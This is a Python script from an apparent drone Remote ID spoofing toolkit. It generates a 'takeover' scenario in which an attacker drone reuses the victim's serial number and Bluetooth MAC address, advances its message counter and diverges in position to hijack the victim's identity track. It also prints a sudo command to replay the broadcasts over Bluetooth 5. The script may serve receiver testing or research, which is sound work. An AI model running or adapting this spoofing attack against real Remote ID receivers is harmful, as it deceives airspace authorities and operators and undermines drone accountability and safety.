#!/usr/bin/env python3
import base64
import json
import os
import sys

# Add the parent directory to the Python path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from drone_rid_spoofer.state import DroneState
from drone_rid_spoofer.messages import build_all_messages, build_self_id
from drone_rid_spoofer.helpers import generate_ble_mac

def main():
    mac_address = generate_ble_mac()
    serial = b"TAKEOVER_TEST_001"
    
    # Drone A starts at a specific location
    lat_A = 473769000  # Zurich somewhere
    lng_A = 85417000
    
    # Drone B starts at a slightly different location
    lat_B = 473770000
    lng_B = 85418000
    
    pilot_loc = (lat_A, lng_A)
    
    drone_A = DroneState(serial, pilot_loc, lat_A, lng_A, mac_address, mac_address)
    drone_B = DroneState(serial, pilot_loc, lat_B, lng_B, mac_address, mac_address)
    
    events = []
    
    # Simulation settings
    duration_phase_1 = 25   # Drone A alone (50 messages at 2 Hz)
    duration_phase_2 = 50   # Drone A and B overlapping
    
    fps = 2  # 2 Hz broadcast to wait more in between messages
    
    counter_A = 0
    counter_B = 0
    
    time_ms = 0
    
    print("Generating Phase 1: Drone A only...")
    for _ in range(duration_phase_1 * fps):
        # Move Drone A east
        drone_A.lat += 10
        drone_A.lng += 10
        drone_A.drift_kinematics()
        drone_A.timestamp_offset = time_ms / 60000.0
        
        msgs_A = build_all_messages(drone_A, omit_self_id=True)
        msgs_A.insert(2, build_self_id(b"Drone A (Original)"))
        msgs_b64 = [base64.b64encode(m).decode('ascii') for m in msgs_A]
        
        events.append({
            "time_offset_ms": time_ms,
            "transport": "bt5",
            "mac": mac_address,
            "session_id": "drone_A",
            "counter": counter_A % 256,
            "messages_b64": msgs_b64
        })
        
        counter_A += 1
        time_ms += (1000 // fps)
        
    print("Generating Phase 2: Drone A and Drone B (Takeover attack)...")
    # Drone B joins and tries to hijack by advancing the counter by 5
    counter_B = counter_A + 5 
    
    for _ in range(duration_phase_2 * fps):
        # Drone A continues its path
        drone_A.lat += 10
        drone_A.lng += 10
        drone_A.drift_kinematics()
        drone_A.timestamp_offset = time_ms / 60000.0
        
        msgs_A = build_all_messages(drone_A, omit_self_id=True)
        msgs_A.insert(2, build_self_id(b"Drone A (Original)"))
        msgs_b64_A = [base64.b64encode(m).decode('ascii') for m in msgs_A]
        
        events.append({
            "time_offset_ms": time_ms,
            "transport": "bt5",
            "mac": mac_address,
            "session_id": "drone_A",
            "counter": counter_A % 256,
            "messages_b64": msgs_b64_A
        })
        
        # Drone B transmits with a different path and an advanced counter
        drone_B.lat -= 10
        drone_B.lng -= 10
        drone_B.drift_kinematics()
        drone_B.timestamp_offset = (time_ms + 10) / 60000.0
        
        msgs_B = build_all_messages(drone_B, omit_self_id=True)
        msgs_B.insert(2, build_self_id(b"Drone B (Attacker)"))
        msgs_b64_B = [base64.b64encode(m).decode('ascii') for m in msgs_B]
        
        events.append({
            "time_offset_ms": time_ms + 10, # Slightly offset in time to avoid exact collision
            "transport": "bt5",
            "mac": mac_address,
            "session_id": "drone_B",
            "counter": counter_B % 256,
            "messages_b64": msgs_b64_B
        })
        
        counter_A += 1
        counter_B += 1
        time_ms += (1000 // fps)
        
    out_file = os.path.join(os.path.dirname(__file__), "takeover.jsonl")
    with open(out_file, 'w') as f:
        for ev in events:
            f.write(json.dumps(ev) + "\n")
            
    print(f"Generated {len(events)} events in {out_file}")
    print("You can now run this scenario using:")
    print(f"sudo .venv/bin/python3 experiments/replay_drones.py experiments/takeover.jsonl --transport bt5")

if __name__ == "__main__":
    main()
